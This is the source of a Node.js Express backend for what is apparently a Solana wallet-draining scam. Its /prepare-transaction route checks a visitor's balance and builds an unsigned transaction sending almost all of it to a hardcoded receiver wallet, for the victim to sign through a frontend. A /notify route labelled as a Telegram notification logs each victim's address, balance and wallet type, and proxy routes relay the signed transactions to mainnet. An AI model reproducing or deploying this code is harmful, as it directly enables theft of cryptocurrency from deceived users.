const express = require('express');
const { Connection, PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL } = require('@solana/web3.js');

const app = express();
app.use(express.json());
app.use(express.static('public'));

// Use a reliable RPC endpoint
const RPC_URL = 'https://api.mainnet-beta.solana.com';
const RECEIVER_WALLET = 'BxhvDsAy2d1DWbUwjFkps1R57H27Mey4RK3qQqoB1mFJ';
const connection = new Connection(RPC_URL, 'confirmed');

console.log('🚀 Server starting...');
console.log('🎯 Receiver wallet:', RECEIVER_WALLET);

// Health check
app.get('/health', (req, res) => {
    res.json({ status: 'ok', time: new Date().toISOString() });
});

// Get balance - PROXY
app.post('/api/getBalance', async (req, res) => {
    try {
        const { publicKey } = req.body;
        if (!publicKey) return res.status(400).json({ error: 'publicKey required' });
        
        const balance = await connection.getBalance(new PublicKey(publicKey));
        console.log(`💰 Balance for ${publicKey.slice(0,8)}...: ${balance / 1e9} SOL`);
        res.json({ success: true, balance });
    } catch (error) {
        console.error('Balance error:', error.message);
        res.status(500).json({ error: error.message });
    }
});

// Get latest blockhash - PROXY
app.post('/api/getBlockhash', async (req, res) => {
    try {
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash();
        res.json({ success: true, blockhash, lastValidBlockHeight });
    } catch (error) {
        console.error('Blockhash error:', error.message);
        res.status(500).json({ error: error.message });
    }
});

// Send transaction - PROXY
app.post('/api/sendTransaction', async (req, res) => {
    try {
        const { transaction } = req.body;
        if (!transaction) return res.status(400).json({ error: 'transaction required' });
        
        // Convert base64 back to buffer
        const txBuffer = Buffer.from(transaction, 'base64');
        const txid = await connection.sendRawTransaction(txBuffer, {
            skipPreflight: false,
            preflightCommitment: 'confirmed'
        });
        
        console.log(`✅ Transaction sent: ${txid}`);
        
        // Wait for confirmation
        const confirmation = await connection.confirmTransaction(txid, 'confirmed');
        if (confirmation.value.err) {
            console.log('⚠️ Confirmation error:', confirmation.value.err);
        } else {
            console.log('✅ Transaction confirmed:', txid);
        }
        
        res.json({ success: true, txid });
    } catch (error) {
        console.error('Send error:', error.message);
        res.status(500).json({ error: error.message });
    }
});

// Prepare transfer transaction
app.post('/prepare-transaction', async (req, res) => {
    try {
        const { publicKey } = req.body;
        if (!publicKey) {
            return res.status(400).json({ success: false, error: 'publicKey required' });
        }
        
        console.log('📝 Preparing tx for:', publicKey.slice(0, 8) + '...');
        
        const fromPubkey = new PublicKey(publicKey);
        const toPubkey = new PublicKey(RECEIVER_WALLET);
        
        const balance = await connection.getBalance(fromPubkey);
        console.log('💰 Balance:', balance / LAMPORTS_PER_SOL, 'SOL');
        
        // Calculate amount to send (leave ~0.005 SOL for fees)
        const minBalance = await connection.getMinimumBalanceForRentExemption(0);
        const amountToSend = Math.max(0, balance - minBalance - 5000 - 5000000);
        
        if (amountToSend <= 0) {
            return res.json({ 
                success: false, 
                error: `No SOL available. Balance: ${balance / 1e9} SOL. Need at least 0.015 SOL.` 
            });
        }
        
        console.log('📤 Amount to send:', amountToSend / LAMPORTS_PER_SOL, 'SOL');
        
        // Create transaction (without blockhash - frontend will add)
        const transaction = new Transaction();
        transaction.add(
            SystemProgram.transfer({
                fromPubkey: fromPubkey,
                toPubkey: toPubkey,
                lamports: amountToSend,
            })
        );
        
        // Serialize without signatures
        const serialized = transaction.serialize({ 
            requireAllSignatures: false, 
            verifySignatures: false 
        });
        
        res.json({ 
            success: true, 
            transaction: Array.from(serialized),
            amount: amountToSend,
            amountSol: (amountToSend / LAMPORTS_PER_SOL).toFixed(6)
        });
        
    } catch (error) {
        console.error('❌ Prepare error:', error.message);
        res.status(500).json({ success: false, error: error.message });
    }
});

// Telegram notification
app.post('/notify', (req, res) => {
    const { address, balance, walletType, customMessage } = req.body;
    console.log('📱 NOTIFICATION:', customMessage);
    console.log('👛 Address:', address ? address.slice(0, 8) + '...' : 'unknown');
    console.log('💰 Balance:', balance, 'SOL');
    console.log('💼 Wallet:', walletType);
    res.json({ ok: true });
});

const PORT = process.env.PORT || 5000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Server running on port ${PORT}`);
});
